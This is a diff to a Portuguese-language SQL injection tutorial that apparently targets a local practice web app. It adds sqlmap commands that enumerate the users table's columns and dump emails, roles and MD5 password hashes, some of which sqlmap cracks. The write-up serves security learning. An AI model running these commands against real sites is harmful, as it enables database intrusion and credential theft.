@@ -173,11 +173,16 @@ Aqui temos que:
 
 Quando executamos isso no nosso teste, foi possível descobrir as tabelas existentes no banco de dados. Foi possível descobrir a tabela Users e, por isso, vamos focar nela para tentarmos descobrir credenciais. Para isso, executa-se o seguinte comando: 
 
+```python3 sqlmap.py -u "http://localhost:3000/rest/products/search?q=test" --dbms=sqlite --prefix "'))" --suffix "--" --level=5 --risk=3 --batch -T users --columns```
+
+- ```-T Users```: Define a tabela alvo.
+
+Com isso, conseguimos descobrir as colunas da tabela Users: id, email, password e role. Então podemos especificar essas colunas usando o comando:
+
 ```python3 sqlmap.py -u "http://localhost:3000/rest/products/search?q=test" --dbms=sqlite --prefix "'))" --suffix "--" -T Users -C "id,email,password,role" --dump --batch```
 
 onde:
 
-- ```-T Users```: Define a tabela alvo.
 - ```-C "id,email,password,role"```: As colunas de interesse (Descobertos pelo comando do sqlmap utilizado anteriormente).
 
 Com isso, conseguimos obter os usuários, seus papéis (roles) e as senhas (as quais utilizavam para criptografica Hash MD5) sendo que algumas senhas já foram descriptografadas pelo próprio sqlmap.
